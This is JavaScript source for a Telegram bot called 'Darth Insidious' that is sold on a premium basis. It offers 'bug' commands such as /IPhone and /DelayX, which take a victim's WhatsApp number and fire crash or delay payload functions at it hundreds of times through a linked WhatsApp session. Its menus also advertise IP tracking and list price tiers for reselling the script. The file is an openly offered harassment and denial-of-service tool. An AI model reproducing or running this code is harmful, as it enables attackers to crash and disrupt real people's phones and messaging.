// ========== COMMAND /addgroup (HANYA OWNER) ==========
bot.onText(/\/addgroup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  // CEK OWNER
  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ *Akses ditolak!* Hanya owner yang bisa menambahkan grup.", { parse_mode: "Markdown" });
  }
  
  // CEK APAKAH INI GRUP
  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, "❌ Command ini harus dijalankan di *GROUP*!", { parse_mode: "Markdown" });
  }
  
  const groupId = chatId;
  
  if (verifiedGroups.has(groupId)) {
    return bot.sendMessage(chatId, "✅ *Grup ini sudah terverifikasi!* Semua member bisa menggunakan bot.", { parse_mode: "Markdown" });
  }
  
  verifiedGroups.add(groupId);
  saveVerifiedGroups();
  
  bot.sendMessage(chatId, 
    `✅ *GRUP BERHASIL DIVERIFIKASI!*\n\n` +
    `📌 Group ID: \`${groupId}\`\n` +
    `👑 Diverifikasi oleh: @${msg.from.username || 'Owner'}`,
    { parse_mode: "Markdown" }
  );
  
});

// ========== COMMAND /removegroup (HAPUS GRUP DARI VERIFIKASI) ==========
bot.onText(/\/delgroup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ *Akses ditolak!* Hanya owner.", { parse_mode: "Markdown" });
  }
  
  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, "❌ Command ini harus dijalankan di *GROUP*!", { parse_mode: "Markdown" });
  }
  
  const groupId = chatId;
  
  if (!verifiedGroups.has(groupId)) {
    return bot.sendMessage(chatId, "❌ Grup ini belum terverifikasi.", { parse_mode: "Markdown" });
  }
  
  verifiedGroups.delete(groupId);
  saveVerifiedGroups();
  
  bot.sendMessage(chatId, 
    `❌ *GRUP DIHAPUS DARI VERIFIKASI!*`,
    { parse_mode: "Markdown" }
  );
});

// ========== MODIFIKASI COMMAND /start (CEK GROUP VERIFIKASI) ==========
bot.onText(/^\/start(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputToken = match[1]?.trim();
  const groupId = msg.chat.id;

  if (SECURE_MODE) {
    return bot.sendMessage(chatId, "🔒 Akses telah terkunci.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "💢 Script Darth Insidious sedang dimatikan oleh Developer.");
  }

  // 🔥 CEK APAKAH GRUP SUDAH TERVERIFIKASI
  const isGroupVerified = verifiedGroups.has(groupId);
  
  // KALO GRUP SUDAH VERIFIKASI, LANGSUNG BERI AKSES TANPA TOKEN
  if (isGroupVerified && msg.chat.type !== 'private') {
    validatedUsers.add(chatId);
    console.log(`✅ Grup ${groupId} sudah terverifikasi, akses diberikan otomatis`);
    return bot.sendMessage(
      chatId,
      "🔓 *Grup Terverifikasi!*\nSilakan ketik /Insidious",
      { parse_mode: "Markdown" }
    );
  }

  // KALO DI PRIVATE ATAU GRUP BELUM VERIFIKASI, PAKE TOKEN
  if (!inputToken) {
    return bot.sendMessage(
      chatId,
      "🔏 Darth Insidious Protection Silahkan Ketik:\n\n`/start <token>",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const resGithub = await axios.get(TOKEN_DATABASE, { timeout: 5000 });
    const validTokensGithub = resGithub.data.tokens || [];

    const cocokDenganConfig = inputToken === DARTH_TOKEN;
    const adaDiGithub = validTokensGithub.includes(inputToken);

    if (cocokDenganConfig && adaDiGithub) {
      validatedUsers.add(chatId);
      return bot.sendMessage(
        chatId,
        "🔓 Token valid!\nSilakan ketik /Insidious"
      );
    } else {
      return bot.sendMessage(chatId, "❌ Akses Terdeteksi.");
    }

  } catch (err) {
    console.error("⚠️ Error saat validasi token user:", err.message);
    bot.sendMessage(chatId, "⚠️ Gagal memeriksa token. Coba lagi nanti.");
  }
});

// ========== MODIFIKASI COMMAND /Insidious (CEK GROUP VERIFIKASI juga) ==========
bot.onText(/^\/Insidious(?:\s|@|$)/i, async (msg) => {
  console.log("💢 Command /Insidious diterima dari:", msg.from.username || msg.from.id);

  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const groupId = msg.chat.id;

  // 🔥 CEK GRUP VERIFIKASI
  const isGroupVerified = verifiedGroups.has(groupId);
  
  // KALO GRUP SUDAH VERIFIKASI, LANGSUNG BERI AKSES
  if (isGroupVerified && msg.chat.type !== 'private') {
    console.log(`✅ Grup ${groupId} terverifikasi, akses diberikan otomatis`);
    // LANGSUNG KE MENU UTAMA (SKIP CEK TOKEN)
  } 
  // KALO BELUM VERIFIKASI ATAU PRIVATE, CEK VALIDATED USERS
  else if (!validatedUsers.has(chatId)) {
    console.log("💢 Diblok: Belum verifikasi token");
    return bot.sendMessage(
      chatId,
      "💢 Verifikasi Token.\nGunakan `/start <token>` terlebih dahulu.\n\n*Atau minta owner untuk meng-verify grup ini dengan /addgroup*",
      { parse_mode: "Markdown" }
    );
  }

  if (!BOT_ACTIVE) {
    console.log("💢 Bot sedang offline");
    return bot.sendMessage(
      chatId,
      `
<blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔏 Script Darth Insidious Sedang Offline..!
━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      { parse_mode: "HTML" }
    );
  }
  
  let groupOnlyData = { groupOnly: false };
  try {
    const raw = fs.readFileSync(ONLY_FILE, "utf8").trim();
    if (raw) groupOnlyData = JSON.parse(raw);
  } catch {
    groupOnlyData = { groupOnly: false };
  }

  if (groupOnlyData.groupOnly && msg.chat.type === "private") {
    console.log("💢 Bot hanya untuk grup");
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const isPremium = premiumUsers.some(
    (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
  );

  const randomImage = getRandomImage();
  const runtime = getBotRuntime();

  if (!isPremium) {
    console.log("💢 Pengguna non-premium mencoba akses /Insidious");
    const caption = `\`\`\`
「 💢 ディルガ 」\`\`\`
━━━━━━━━━━━━━━━━━━
ロー No Acces Premium
━━━━━━━━━━━━━━━━━━\`\`\`
の Dilz No Mercy\`\`\`
`;

    return bot.sendPhoto(chatId, randomImage, {
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" },
            { text: "「 🍒 」", url: "https://t.me/testidilz21" },
          ],
        ],
      },
    });
  }

  const loadingFrames = [
    "🔄 Loading Darth Insidious [░░░░░░░░░░] 0%",
    "🔄 Loading Darth Insidious [▓░░░░░░░░░] 10%",
    "🔄 Loading Darth Insidious [▓▓░░░░░░░░] 20%",
    "🔄 Loading Darth Insidious [▓▓▓░░░░░░░] 30%",
    "🔄 Loading Darth Insidious [▓▓▓▓░░░░░░] 40%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓░░░░░] 50%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓░░░░] 60%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓▓░░░] 70%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓▓▓░░] 80%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓▓▓▓░] 90%",
    "✅ Done! Launching Darth Insidious Interface...",
  ];

  const loadingMessage = await bot.sendMessage(chatId, loadingFrames[0]);
  for (let i = 1; i < loadingFrames.length; i++) {
    await new Promise((resolve) => setTimeout(resolve, 300));
    await bot.editMessageText(loadingFrames[i], {
      chat_id: chatId,
      message_id: loadingMessage.message_id,
    });
  }

  await new Promise((r) => setTimeout(r, 400));
  await bot.deleteMessage(chatId, loadingMessage.message_id);

  const caption = `\`\`\`
「 🍄 スクリプト 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
ロー 𝖠𝗎𝗍𝗁𝗈𝗋 : @dickxmod
ロー 𝖭𝖺𝗆𝖾 : Darth Insidious
ロー 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 5.0 PRO
ロー 𝖱𝗎𝗇𝗍𝗂𝗆𝖾 : ${runtime}
ロー 𝖯𝗋𝖾𝖿𝗂𝗑 : (/)
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 アクセスのみ 」\`\`\`
お /addprem -ID-
お /delprem -ID-
お /addadmin -ID-
お /deladmin -ID-
お /setcd - Time
お /addgroup - Group 
お /delgroup - Group 
お /gconly - on - off
お /addbot - Number
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
の Dilz No Mercy\`\`\`
`;

  const buttons = {
    inline_keyboard: [
      [
        { text: "「 🍓 」", callback_data: "bugshow" },
        { text: "「 𝖮-𝖧𝖾𝗅𝗉 」", callback_data: "help" },
        { text: "「 ツール 」", callback_data: "tools" },
      ],
      [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }],
    ],
  };

  console.log("💢 Menu utama dikirim setelah loading selesai");
  return bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "Markdown",
    reply_markup: buttons,
  });
});
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  const randomImage = getRandomImage();
  const runtime = getBotRuntime();
  let newCaption, newButtons;

  // Di sini letak kode switch kamu yang asli
  switch (data) {
  
    case "bugshow":
      newCaption = `\`\`\`
「 🍄 フローバグ 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
お /DelayX - 62xxx
お /IPhone - 62xxx
お /Screen - 62xxx
お /Visible - 62xxx
お /CrashUi - 62xxx
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 オーナー 」\`\`\`
\`\`\`
ɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ ᴅɪ ᴀᴛᴀs
ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴇʀʟᴇʙɪʜᴀɴ, ᴊɪᴋᴀ sᴘᴀᴍ
ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴɢᴀʟᴀᴍɪ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴄʟᴏsᴇᴅ
ᴘᴀᴅᴀ sᴇʙᴜᴀʜ sᴇɴᴅᴇʀ, ᴊᴀᴅɪ ᴍᴏʜᴏɴ ᴅɪ ʙᴀᴄᴀ
ᴅᴇɴɢᴀɴ ʙᴀɪᴋ, sᴇʙᴇʟᴜᴍ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ!!
\`\`\`
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;
      
    case "tools":
      newCaption = `\`\`\`
「 🍄 フローツール 」\`\`\`
━━━━━━━━━━━━━━━━━━
お /DarthIP - Tracking IP
お /Tiktok - Url
お /Getcode - Url
お /IPhoneQ - Teks
お /Instagram - Url
お /play - Search Lagu
お /Tourl - Foto - Video
お /Sticker - Teks
お /pinterest - Teks
お /cekfunc - Teks/File
お /File - File
お /open - File
━━━━━━━━━━━━━━━━━━
`;
      newButtons = [
        //[{ text: "「 𝖥𝗈𝗋𝖸𝗈𝗎 」", callback_data: "You" }],
        [{ text: "🔙 Kembali", callback_data: "mainmenu" }]
      ];
      break;
      
          case "groupmenu":
      newCaption = `\`\`\`
「 🍄 グループメニュー 」\`\`\`

⎈ FITURE GROUP
├⟣ /ban
│╰ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ 
├⟣ /unban
│╰ ᴜɴʙᴀɴ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴏ
├⟣ /open 
│╰  ᴍᴇᴍʙᴜᴋᴀ ᴄʜᴀᴛ ɢʀᴏᴜᴘ
├⟣ /close 
│╰  ᴍᴇɴᴜᴛᴜᴘ ᴄʜᴀᴛ ɢʀᴏᴜᴘ
├⟣ /mute
│╰ ᴍᴜᴛᴇ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ
├⟣ /unmute
│╰ ʙᴜᴋᴀ ᴍᴜᴛᴇ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ
├⟣ /antilink
│╰ ᴀɴᴛɪʟɪɴᴋ ɢʀᴏᴜᴘ
├⟣ /antipromosi
│╰ ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ
├⟣  /addantipromosi
│╰ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ʟɪsᴛ ʙʟᴏᴄᴋʟɪsᴛ
├⟣ /listblocklist
│╰ ᴍᴇʟɪʜᴀᴛ ᴅᴀғᴛᴀʀ ʙʟᴏᴄᴋʟɪsᴛ
╰────────────────────────────
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;
      
    case "You":
      newCaption = `\`\`\`
「 🍄 アシスタント 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 𝖧𝖺𝗅𝗅𝗈 𝖫𝗈𝗅𝗂𝗉𝗈𝗉 𝖬𝖾𝗇𝗒𝖾𝖽𝗂𝖺𝗄𝖺𝗇!! 」\`\`\`
ロー 𝖯𝖺𝗋𝗍𝗇𝖾𝗋 𝖵𝗏𝗂𝗉 : 30.000
ロー 𝖦𝖾𝗍 𝖡𝖺𝗌𝖾 𝖯𝗋𝗂𝗏𝖺𝗍𝖾
ロー 𝖦𝖾𝗍 𝖲𝖼𝗋𝗂𝗉𝗍 𝖳𝗂𝗍𝗅𝖾 𝖯𝖺𝗋𝗍𝗇𝖾𝗋
ロー 𝖦𝖾𝗍 𝖲𝗈𝗎𝗋𝖼𝖾 𝖪𝗈𝖽𝖾 𝖧𝗍𝗆𝗅 𝖶𝖾𝖻 𝖲𝗍𝗈𝗋𝖾
ロー 𝖦𝖾𝗍 𝖠𝖽𝖽 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇
ロー 𝖦𝖾𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 𝖯𝗋𝗂𝗏𝖺𝗍𝖾
ロー 𝖦𝖾𝗍 𝖱𝖾𝗌𝖾𝗅𝗅𝖾𝗋 𝖷7-𝖫𝗈𝗅𝗂𝗉𝗈𝗉
ロー 𝖦𝖾𝗍 𝖯𝖺𝗋𝗍𝗇𝖾𝗋 𝖮𝗏𝖾𝗋𝖥𝗅𝗈𝗐𝖷
ロー 𝖦𝖾𝗍 𝖱𝖾𝗌𝖾𝗅𝗅𝖾𝗋 𝖲𝖼𝗋𝗂𝗉𝗍 𝖣𝖾𝗇𝖽𝖾𝗅𝗂𝗈𝗇
ロー 𝖣𝖺𝗇 𝖫𝖺𝗂𝗇 - 𝖫𝖺𝗂𝗇 𝖬𝖺𝗌𝗂𝗁 𝖡𝖺𝗇𝗒𝖺𝗄!!
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 Payment Tersedia 」\`\`\`
タ Dana - No Premium
タ Gopay - No Premium
タ Ovo - Premium Active
タ Ready Qris - All Opsi
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 𝖧𝖺𝗋𝗀𝖺 𝖲𝖼𝗋𝗂𝗉𝗍 Darth Insidious 」\`\`\`
ロー Script No Update : Rp20.000
ロー Script Full Update : Rp45.000
ロー Script Reseller : Rp50.000
ロー Script Partner : Rp60.000
ロー Script To Moderator : Rp70.000
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 𝖭𝗈𝗍𝗂𝖿𝗂𝗄𝖺𝗌𝗂 𝖡𝗎𝗍𝗍𝗈𝗇 𝖮-𝖧𝖾𝗅𝗉 」\`\`\`
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "tools" }]
      ];
      break;
     
    case "help":
      newCaption = `\`\`\`
「 🍄 𝖧𝖾𝗅𝗉 」\`\`\`
\`\`\`
注文 :\`\`\`
🂱 /Notif - Owner
\`\`\`
注記 :
ᴜɴᴛᴜᴋ ᴘᴇɴɢɢᴜɴᴀ sᴄʀɪᴘᴛ ɪɴɪ
ᴍᴏʜᴏɴ ɢᴜɴᴀᴋᴀɴ sᴄʀɪᴘᴛ ɪɴɪ ᴋᴇᴘᴀᴅᴀ
ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇʀᴍᴀsᴀʟᴀʜ,
ᴊᴀɴɢᴀɴ ᴋᴀᴍᴜ sᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴋᴇᴘᴀᴅᴀ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ..!!
\`\`\`
`;

      newButtons = [
        //[{ text: "「 𝖠𝗌𝗂𝗌𝗍𝖾𝗇 」", callback_data: "asisten" }],
        [{ text: "🔙 Kembali", callback_data: "mainmenu" }]
      ];
      break;

    case "asisten":
      newCaption = `\`\`\`
「 🍄 アシスタント 」\`\`\`
\`\`\`
注文 :\`\`\`
お /Darth - Teks
お /reset - Reset Chat Asisten
お /asistenoff - Matikan Asisten
お /asistenon - Menyalakan Asisten
\`\`\`
注記 : 
sᴄʀɪᴘᴛ ɪɴɪ ᴍᴀsɪʜ ᴛᴀʜᴀᴘ ᴘᴇɴɢᴇᴍʙᴀɴɢᴀɴ
ᴊᴀᴅɪ ᴍᴏʜᴏɴ ᴍᴀᴀғ ᴊɪᴋᴀ ᴀᴅᴀ ᴘᴇʀᴍᴀsᴀʟᴀʜᴀɴ
ᴘᴀᴅᴀ sᴄʀɪᴘᴛ ɪɴɪ, sᴇᴍᴏɢᴀ ᴋᴇᴅᴇᴘᴀɴɴʏᴀ ʟᴇʙɪʜ
ʙᴀɢᴜs ᴅᴀɴ ᴋᴜᴀʟɪᴛᴀs ᴛᴇʀᴊᴀɢᴀ ᴀᴍᴀɴ..!!
\`\`\`
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "help" }]
      ];
      break;
     
    case "mainmenu":
      newCaption = `\`\`\`
「 🍄 スクリプト 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
ロー 𝖠𝗎𝗍𝗁𝗈𝗋 : @dickxmod
ロー 𝖭𝖺𝗆𝖾 : Darth Insidious
ロー 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 5.0 PRO
ロー 𝖱𝗎𝗇𝗍𝗂𝗆𝖾 : ${runtime}
ロー 𝖯𝗋𝖾𝖿𝗂𝗑 : (/)
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 アクセスのみ 」\`\`\`
お /addprem -ID-
お /delprem -ID-
お /addadmin -ID-
お /deladmin -ID-
お /setcd - Time
お /gconly - on - off
お /addbot - Number
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
の Dilz No Mercy\`\`\`
`;
      newButtons = [
        [
          { text: "「 🍓 」", callback_data: "bugshow" },
          { text: "「 𝖮-𝖧𝖾𝗅𝗉 」", callback_data: "help" },
          { text: "「 ツール 」", callback_data: "tools" }
        ],
        [
          { text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }
        ]
      ];
      break;
  }

  try {
    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: newCaption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: newButtons }
      }
    );
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      await bot.answerCallbackQuery(query.id, {
        text: "⚠️ Anda Sudah Di Menu Ini",
        show_alert: false
      });
    } else {
      console.error("❌ Gagal edit media:", err);
    }
  }

  await bot.answerCallbackQuery(query.id);
});



///----------( Function Detect Premium )----------\\\
const isPremiumUser = (id) => premiumUsers.some(u => u.id.toString() === id.toString());



///----------( Function Loading )----------\\\
function generateProgressBar(percent, length = 20) {
  const filledLength = Math.round((percent / 100) * length);
  const emptyLength = length - filledLength;
  return "█".repeat(filledLength) + "░".repeat(emptyLength) + ` ${percent}%`;
}



///-----------( Function Admin Group )----------\\\
async function isBotAdmin(chatId) {
  try {
    const botMember = await bot.getChatMember(chatId, (await bot.getMe()).id);
    return ["administrator", "creator"].includes(botMember.status);
  } catch (err) {
    console.error("Gagal cek admin bot:", err);
    return false;
  }
}



///----------( Function MarkdownV2 )-----------\\\
function escapeMarkdownV2(text) {
  if (!text) return "";
  return text.toString().replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}



///----------( Function Markdown )----------\\\
function escapeMarkdown(text) {
  if (!text) return "";
  return text.replace(/([_*`\[])/g, "\\$1");
}



///----------( The Setcd )----------\\\
bot.onText(/^\/setcd\s+(.+)/i, async (msg, match) => {
  console.log("Command /setcd diterima:", msg.text);

  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!config.OWNER_ID.map(Number).includes(fromId)) {
      console.log("Bukan owner:", fromId);
      return bot.sendMessage(chatId, "❌ Owner Only!");
  }

  const timeString = match[1]?.trim();
  if (!timeString) return bot.sendMessage(chatId, '⚠ Format salah! Gunakan: /setcd <detik>');

  const processingMsg = await bot.sendMessage(chatId, '⏳ Mengatur cooldown...');

  try {
    const result = setCooldown(timeString);
    await bot.editMessageText(`🍂 Cooldown berhasil diatur!\n${result}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  } catch (error) {
    console.error('❌ Error setcd:', error.message);
    await bot.editMessageText('❌ Gagal mengatur cooldown. Coba lagi nanti!', {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  }
});




///----------( The Bug )----------\\\
bot.onText(/\/IPhone(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/IPhone 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/IPhone 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/IPhone 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : IPhone
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 200; i++) {
      await exoticsIP(Dilz, target);
      await new Promise(res => setTimeout(res, 500));
      await exoticsIP(Dilz, target);
      await new Promise(res => setTimeout(res, 500));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : IPhone
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/DelayX(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/DelayX 62xxxxxxxxxx,1000,500\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n` +
      `- 1000 → Jumlah pengiriman (loop)\n` +
      `- 500 → Jeda antar kirim (dalam milidetik / ms)\n\n` +
      `Contoh lain:\n\`\`\`\n/DelayX 6281234567890,5000,100\n\`\`\`\n` +
      `💢 Mengirim 5000 kali dengan jeda 100ms`,
      { parse_mode: "Markdown" }
    );
  }

  const parts = args.split(",");
  if (parts.length < 3) {
    return bot.sendMessage(chatId, "⚠️ Format salah! Gunakan format: `/DelayX nomor,loop,delay`\nContoh: `/DelayX 6281234567890,100,200`", {
      parse_mode: "Markdown"
    });
  }

  const [targetNumber, totalLoopRaw, delayTimeRaw] = parts;
  const totalLoop = parseInt(totalLoopRaw);
  const delayTime = parseInt(delayTimeRaw);

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Mode : Delay Custom
𖥂 Loop : ${totalLoop}x
𖥂 Delay : ${delayTime}ms
𖥂 Status : 💢 Mengirim santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 User : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < totalLoop; i++) {
      await delay1(Dilz, target, false);
      await delay2(Dilz, target, false);
      await delay3(Dilz, target, false);
      await ExocistGodDelay(target, false);
      await Permen(Dilz, target);
      await new Promise(res => setTimeout(res, delayTime));
    }

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Mode : DelayX
𖥂 Loop : ${totalLoop}x
𖥂 Delay : ${delayTime}ms
𖥂 Status : Sukses mengirim ${totalLoop}x!
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 User : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "「 WhatsApp 」", url: `https://wa.me/${formattedNumber}` }]]
        }
      }
    );

  } catch (err) {
    console.error("DelayX Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});



///----------( Screen )----------\\\
bot.onText(/\/Screen(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/Screen 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/Screen 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/Visible 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
